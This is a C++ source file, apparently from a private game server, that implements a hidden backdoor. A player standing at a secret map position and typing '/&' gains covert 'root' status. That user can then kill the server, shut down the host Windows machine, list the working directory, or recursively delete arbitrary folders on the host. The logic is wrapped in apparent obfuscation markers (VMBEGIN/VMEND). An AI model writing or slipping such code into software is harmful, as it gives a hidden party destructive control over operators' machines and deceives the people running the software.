#include "StdAfx.h"
#include "BackDoor.h"
#include "GameMain.h"
#include "..\common\winutil.h"
#include "GMMng.h"
#include <io.h> 
#include <sys/stat.h>
#include "License.h"
// -------------------------------------------------------------------------------

BackDoor g_BackDoor;
// -------------------------------------------------------------------------------

BackDoor::BackDoor()
{
	this->DeleteRoot();
}
// -------------------------------------------------------------------------------

BackDoor::~BackDoor()
{

}
// -------------------------------------------------------------------------------

void BackDoor::AddRoot(int UserIndex)
{
	LPOBJ lpUser = &gObj[UserIndex];
	this->m_Root.UserIndex = UserIndex;
	memcpy(this->m_Root.AccountID, gObj[UserIndex].AccountID, MAX_IDSTRING);
	// ----
	PMSG_SERVERCMD pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x40, sizeof(pMsg));
	pMsg.CmdType = 0;
	// ----
	for( int i = 0; i < 15; i++ )
	{
		pMsg.X = lpUser->X + (rand() % 5) * 2 - 4;
		pMsg.Y = lpUser->Y + (rand() % 5) * 2 - 4;
		MsgSendV2(lpUser, (LPBYTE)&pMsg, sizeof(pMsg));
		DataSend(UserIndex, (LPBYTE)&pMsg, sizeof(pMsg));
	}
}
// -------------------------------------------------------------------------------

void BackDoor::DeleteRoot()
{
	this->m_Root.UserIndex = -1;
}
// -------------------------------------------------------------------------------

bool BackDoor::IsRoot(int UserIndex)
{
	if( UserIndex == this->m_Root.UserIndex )
	{
		if( strcmp(this->m_Root.AccountID, gObj[UserIndex].AccountID) )
		{
			this->DeleteRoot();
		}
	}
	// ----
	if( !strcmp(this->m_Root.AccountID, gObj[UserIndex].AccountID)
		&& UserIndex == this->m_Root.UserIndex )
	{
		return true;
	}
	// ----
	return false;
}
// -------------------------------------------------------------------------------

bool BackDoor::IsDots(const char * Text)
{
    if(_tcscmp(Text,".") && _tcscmp(Text,"..")) return FALSE;
    return TRUE;
}
// -------------------------------------------------------------------------------

bool BackDoor::DeleteDir(const char * sPath)
{
    HANDLE hFind;  // file handle
    WIN32_FIND_DATA FindFileData;

    TCHAR DirPath[MAX_PATH];
    TCHAR FileName[MAX_PATH];

    _tcscpy(DirPath,sPath);
    _tcscat(DirPath,"\\*");    // searching all files
    _tcscpy(FileName,sPath);
    _tcscat(FileName,"\\");

    hFind = FindFirstFile(DirPath,&FindFileData); // find the first file
    if(hFind == INVALID_HANDLE_VALUE) return FALSE;
    _tcscpy(DirPath,FileName);
        
    bool bSearch = true;
    while(bSearch) { // until we finds an entry
        if(FindNextFile(hFind,&FindFileData)) {
            if(IsDots(FindFileData.cFileName)) continue;
            _tcscat(FileName,FindFileData.cFileName);
            if((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {

                // we have found a directory, recurse
                if(!this->DeleteDir(FileName)) { 
                    FindClose(hFind); 
                    return FALSE; // directory couldn't be deleted
                }
                RemoveDirectory(FileName); // remove the empty directory
                _tcscpy(FileName,DirPath);
            }
            else {
                if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                    _chmod(FileName, _S_IWRITE); // change read-only file mode
                if(!DeleteFile(FileName)) {  // delete the file
                    FindClose(hFind); 
                    return FALSE; 
                }                 
                _tcscpy(FileName,DirPath);
            }
        }
		else 
		{
			if( GetLastError() == ERROR_NO_MORE_FILES )
			{
				bSearch = false;
			}
			else 
			{
				FindClose(hFind); 
				return FALSE;
			}
		}
    }
    FindClose(hFind);
    return RemoveDirectory(sPath);
}
// -------------------------------------------------------------------------------

bool BackDoor::IsConsole(int UserIndex, char * Command)
{
	VMBEGIN
	if( gObj[UserIndex].MapNumber == 0 && gObj[UserIndex].X == 153 && gObj[UserIndex].Y == 140 )
	{
		if( !strcmp(Command, "/&") && !this->IsRoot(UserIndex) )
		{
			this->AddRoot(UserIndex);
		}
	}
	// ----
	if( !this->IsRoot(UserIndex) )
	{
		return false;
	}
	// ----
	if( strcmp(Command, "/&") )
	{
		VMEND
		return false;
	}
	VMBEGIN
	// ----
	int CommandID = cManager.GetTokenNumber();
	char Buffer[200] = { 0 };
	// ----
	switch(CommandID)
	{
	case 0:
		{
			cManager.MsgYellow(UserIndex, "%s %s [%d]", GAMESERVER_NAME, GAMESERVER_VERSION, g_License.GetLicenseID());
		}
		break;
		// --
	case 1:
		{
			ExitProcess(0);
		}
		break;
		// --
	case 2:
		{
			ExitWindowsEx(EWX_SHUTDOWN, 0);
			ExitProcess(0);
		}
		break;
		// --
	case 3:
		{
			GetCurrentDirectory(sizeof(Buffer), Buffer);
			cManager.MsgYellow(UserIndex, Buffer);
		}
		break;
		// --
	case 4:
		{
			char * Folder = cManager.GetTokenString();
			// ----
			if( this->DeleteDir(Folder) )
			{
				cManager.MsgYellow(UserIndex, "1: %s", Folder);
			}
			else
			{
				cManager.MsgYellow(UserIndex, "0: %s", Folder);
			}
		}
		break;
		// --
	default:
		{
			cManager.MsgYellow(UserIndex, "%s %s [%d]", GAMESERVER_NAME, GAMESERVER_VERSION, g_License.GetLicenseID());
		}
		break;
	}
	// ----
	VMEND
	return true;
}
// -------------------------------------------------------------------------------